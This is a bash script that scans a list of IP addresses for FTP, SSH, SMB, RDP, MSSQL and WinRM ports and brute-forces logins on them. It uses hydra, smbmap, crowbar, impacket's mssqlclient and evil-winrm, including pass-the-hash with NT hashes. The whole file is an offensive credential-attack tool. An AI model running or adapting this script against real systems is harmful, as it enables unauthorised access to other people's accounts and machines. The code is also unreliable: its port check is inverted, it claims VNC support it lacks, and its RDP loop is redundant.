#!/bin/bash

function help(){
        echo "[!] Usage"
        echo "First argument - File containing all IP address"
        echo "Second argument - File contaning all usernames"
        echo "Third argument - File containing all passwords"
}

if [ $# -ne 3 ]
then
        help
        exit 1
fi

echo "This supports ftp,smb,ssh and vnc auto detector and brute forcer"

ports="21 445 22 3389 1433 5985"

filename=$1
users=$2
passwords=$3

for ips in $(cat $filename)
do
        for port in $ports
        do
                timeout 2 cat < /dev/tcp/$ips/$port 2>/dev/null 1>/dev/null
                if [ $? -ne 0 ]
                then
                        echo $ips >> $port.txt
                fi
        done
done

echo "[+] Performing auto brute forcer"

for port in $ports
do
        if test -f "$port.txt"
        then
                for ips in $(cat $port.txt)
                do
                        case $port in
                                "21")
                                        hydra -L $users -P $passwords -w 5 -t 3 ftp://$ips
                                        ;;
                                "22")
                                        hydra -L $users -P $passwords -t 3 ssh://$ips
                                        ;;
                                *)
                                        continue
                        esac
                done
        fi
done



for port in $ports
do
        if test -f "$port.txt"
        then
                for ips in $(cat $port.txt)
                do
                        for user in $(cat $users)
                        do
                                for password in $(cat $passwords)
                                do
                                        case $port in
                                                "5985")
                                                        echo "[!] Trying $user:$password"
                                                        echo $password | grep -oP \.*:\.* 1>/dev/null
                                                        if [ $? -eq 0 ]
                                                        then
                                                                nthash=$(echo $password | cut -d ':' -f 2)
                                                                evil-winrm -i $ips -u $user -H $nthash
                                                        else
                                                                evil-winrm -i $ips -u $user -p $password
                                                        fi
                                                        ;;
                                                "1433")
                                                        echo "[!] Trying $user:$password"
                                                        echo $password | grep -oP \.*:\.* 1>/dev/null
                                                        if [ $? -eq 0 ]
                                                        then
                                                                python /root/Tools/impacket/examples/mssqlclient.py -hashes $password $user@$ips
                                                        else
                                                                python /root/Tools/impacket/examples/mssqlclient.py $user:\'$password\'@$ips
                                                        fi
                                                        ;;
                                                "445")
                                                        echo "[!] Trying $user:$password"
                                                        smbmap -u $user -p $password -H $ips 2>/dev/null
                                                        ;;
                                                "3389")
                                                        echo $password | grep -oP \.*:\.* 2>/dev/null
                                                        if [ $? -eq 0 ]
                                                        then
                                                                continue
                                                        else
                                                                crowbar -b rdp -s $ips/32 -U $users -C $passwords
                                                        fi
                                                        ;;
                                                *)
                                                        continue

                                        esac
                                done
                        done
                done
                rm $port.txt
        fi
done
